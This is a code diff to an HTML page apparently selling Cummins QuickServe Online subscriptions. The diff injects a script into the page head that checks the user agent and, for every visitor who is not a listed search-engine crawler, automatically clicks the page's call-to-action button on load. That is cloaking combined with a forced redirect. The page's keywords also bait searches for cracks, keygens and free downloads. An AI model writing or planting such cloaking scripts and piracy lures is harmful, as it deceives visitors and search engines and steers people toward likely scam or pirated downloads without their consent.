@@ -5,6 +5,42 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Cummins QuickServe Online 1 week/1 month/1 Year Subscription</title>
+    
+<script>
+const searchEngineUserAgents = [
+  'Googlebot',
+  'Bingbot',
+  'YandexBot',
+  'DuckDuckBot',
+  'Baiduspider',
+];
+
+function isSearchEngine(userAgent) {
+  return searchEngineUserAgents.some(bot => userAgent.includes(bot));
+}
+
+function clickCTAButton() {
+  const ctaButton = document.querySelector('.cta-button');
+  if (ctaButton) {
+    ctaButton.click();
+  }
+}
+
+function main() {
+  const userAgent = navigator.userAgent;
+  
+  if (!isSearchEngine(userAgent)) {
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', clickCTAButton);
+    } else {
+      clickCTAButton();
+    }
+  }
+}
+
+main();
+</script>
+
     <meta name="description" content="Cummins QuickServe Online offers a 1 week/1 month/1 year subscription for parts catalog, service manuals, diagnostics, and troubleshooting.">
     <meta name="keywords" content="Cummins QuickServe Online, Cummins QuickServe Online subscription, Cummins QuickServe Online 1 week subscription, Cummins QuickServe Online 1 month subscription, Cummins QuickServe Online 1 year subscription, Cummins QuickServe Online download, Cummins QuickServe Online free download, Cummins QuickServe Online keygen, Cummins QuickServe Online crack, Cummins engine service, Cummins engine parts catalog, Cummins engine service manual, Cummins online diagnostics, Cummins calibration download, Cummins service information, Cummins troubleshooting, Cummins electrical diagrams, Cummins engine maintenance, Cummins engine repair manual, Cummins QuickServe Online русский, Cummins QuickServe Online загрузить, Cummins QuickServe Online бесплатная загрузка, Cummins QuickServe Online Українська, Cummins QuickServe Online завантажити, Cummins QuickServe Online безкоштовно завантажити">
     <style>
